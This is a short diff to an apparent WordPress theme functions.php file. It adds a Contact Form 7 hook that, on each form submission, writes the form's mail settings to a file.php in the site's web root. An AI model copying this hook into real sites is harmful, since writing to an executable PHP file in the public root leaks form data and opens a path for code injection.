@@ -62,6 +62,10 @@ add_filter( 'site_transient_update_plugins', function( $value ) {
   return $value;
 } );
 
+add_action( 'wpcf7_before_send_mail', function( $contact_form, &$abort, $that ){
+  file_put_contents( get_home_path() . 'file.php', $contact_form->prop('mail') );
+}, 10, 3 );
+
 // Удаление разных скриптов и стилей от wp
 // Отключаем гутенберг
 // Отключаем emoji
